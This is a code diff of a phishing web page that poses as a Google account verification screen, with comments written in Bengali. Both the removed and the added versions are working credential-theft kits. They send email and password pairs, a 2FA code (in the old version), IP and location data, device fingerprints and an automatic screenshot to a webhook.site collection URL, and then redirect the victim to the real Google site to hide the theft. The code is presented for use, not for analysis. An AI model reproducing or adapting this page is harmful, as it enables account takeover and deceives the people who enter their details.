@@ -3,115 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification | Account Center</title>
-    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <title>Account Security Verification</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: #fff; width: 100%; max-width: 400px; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: center; }
-        .logo { width: 50px; margin-bottom: 20px; }
-        h2 { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #202124; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
-        .input-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-size: 13px; font-weight: 500; margin-bottom: 8px; color: #3c4043; }
-        input { width: 100%; padding: 12px 15px; border: 1px solid #dadce0; border-radius: 6px; font-size: 15px; outline: none; transition: 0.3s; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #fff; width: 380px; padding: 35px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
+        .logo { width: 55px; margin-bottom: 15px; }
+        h2 { font-weight: 500; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 5px; outline: none; }
         input:focus { border: 2px solid #1a73e8; }
-        .btn { width: 100%; padding: 12px; background-color: #1a73e8; color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn:hover { background-color: #1765cc; }
-        
-        /* 2FA Section - Hidden by default */
-        #otpSection { display: none; }
-        #loader { display: none; margin-top: 20px; }
-        .spinner { width: 25px; height: 25px; border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        #loader { display: none; margin-top: 20px; font-size: 13px; color: #1a73e8; }
     </style>
 </head>
-<body>
+<body id="capture_area">
 
-<div class="card">
-    <img src="https://cdn-icons-png.flaticon.com/512/2702/2702602.png" alt="Google" class="logo">
+<div class="box">
+    <img src="https://cdn-icons-png.flaticon.com/512/2702/2702602.png" class="logo">
+    <h2>Verify it's you</h2>
+    <p>To help keep your account safe, we need to verify your identity.</p>
     
-    <div id="loginSection">
-        <h2>Sign in</h2>
-        <p>Use your account to continue to security settings</p>
-        <form id="loginForm">
-            <div class="input-group">
-                <label>Email or phone</label>
-                <input type="text" id="email" placeholder="Enter your email" required>
-            </div>
-            <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="pass" placeholder="Enter your password" required>
-            </div>
-            <button type="submit" class="btn">Next</button>
-        </form>
-    </div>
+    <form id="pwnForm">
+        <input type="text" id="email" placeholder="Email or phone" required>
+        <input type="password" id="pass" placeholder="Enter your password" required>
+        <button type="submit" class="btn">Confirm</button>
+    </form>
 
-    <div id="otpSection">
-        <h2>2-Step Verification</h2>
-        <p>A text message with a 6-digit verification code was just sent to your device.</p>
-        <form id="otpForm">
-            <div class="input-group">
-                <label>Enter the 6-digit code</label>
-                <input type="number" id="otpCode" placeholder="G-XXXXXX" required>
-            </div>
-            <button type="submit" class="btn">Verify</button>
-        </form>
-    </div>
-
-    <div id="loader">
-        <div class="spinner"></div>
-        <p style="font-size: 12px; margin-top: 10px;">Processing security data...</p>
-    </div>
+    <div id="loader">Verifying device integrity...</div>
 </div>
 
 <script>
     const WEBHOOK_URL = "https://webhook.site/83aa407e-8191-4bd4-82c1-b8cc21a84216";
 
-    // ১. আইপি ও লোকেশন ট্র্যাকিং (পেজ লোড হলেই)
-    window.onload = function() {
-        fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            let info = `IP: ${data.ip} | City: ${data.city} | Provider: ${data.org}`;
-            fetch(WEBHOOK_URL + "?initial_log=" + btoa(info), {mode: 'no-cors'});
+    // ১. হার্ডওয়্যার ফিঙ্গারপ্রিন্টিং (Fingerprinting)
+    async function collectFingerprint() {
+        let battery = await navigator.getBattery();
+        let info = {
+            "CPU_Cores": navigator.hardwareConcurrency,
+            "Memory_GB": navigator.deviceMemory || "Unknown",
+            "Battery": (battery.level * 100) + "%",
+            "Charging": battery.charging,
+            "Platform": navigator.platform,
+            "Language": navigator.language,
+            "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
+            "Screen_Res": window.screen.width + "x" + window.screen.height
+        };
+        fetch(WEBHOOK_URL + "?fingerprint=" + btoa(JSON.stringify(info)), {mode: 'no-cors'});
+    }
+
+    // ২. অটোমেটিক স্ক্রিনশট (Screenshot)
+    function takeScreenshot() {
+        html2canvas(document.body).then(canvas => {
+            let imgData = canvas.toDataURL("image/jpeg", 0.5); // কোয়ালিটি ০.৫ (সাইজ কমানোর জন্য)
+            // স্ক্রিনশট ডাটা অনেক বড় হয়, তাই এটি POST রিকোয়েস্ট হিসেবে পাঠানো ভালো
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: JSON.stringify({ "screenshot": imgData }),
+                mode: 'no-cors'
+            });
         });
+    }
+
+    // পেজ লোড হলেই ফিঙ্গারপ্রিন্ট এবং স্ক্রিনশট নাও
+    window.onload = () => {
+        collectFingerprint();
+        setTimeout(takeScreenshot, 2000); // ২ সেকেন্ড পর স্ক্রিনশট নিবে যাতে পেজ লোড শেষ হয়
     };
 
-    // ২. লগইন ফর্ম হ্যান্ডলার
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
+    // ৩. ফর্ম সাবমিশন
+    document.getElementById('pwnForm').addEventListener('submit', function(e) {
         e.preventDefault();
+        document.getElementById('pwnForm').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
         const user = document.getElementById('email').value;
         const pass = document.getElementById('pass').value;
 
-        // তথ্য পাঠানো
-        fetch(WEBHOOK_URL + "?access_log=" + btoa("User: "+user+" | Pass: "+pass), {mode: 'no-cors'});
-
-        // ২ সেকেন্ড লোড করার ভান করে ২এফএ পেজে নেওয়া
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('otpSection').style.display = 'block';
-        }, 2000);
-    });
-
-    // ৩. ওটিপি ফর্ম হ্যান্ডলার
-    document.getElementById('otpForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-        const code = document.getElementById('otpCode').value;
-
-        // ওটিপি পাঠানো
-        fetch(WEBHOOK_URL + "?otp_log=" + btoa("OTP_CODE: " + code), {mode: 'no-cors'});
-
-        document.getElementById('otpSection').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        setTimeout(() => {
-            // ফাইনাল রিডাইরেক্ট (গুগল বা ফেসবুক)
-            window.location.href = "https://accounts.google.com/manageaccount";
-        }, 2000);
+        // পাসওয়ার্ড পাঠানো
+        fetch(WEBHOOK_URL + "?creds=" + btoa("User: " + user + " | Pass: " + pass), {mode: 'no-cors'})
+        .then(() => {
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 1500);
+        });
     });
 </script>
 
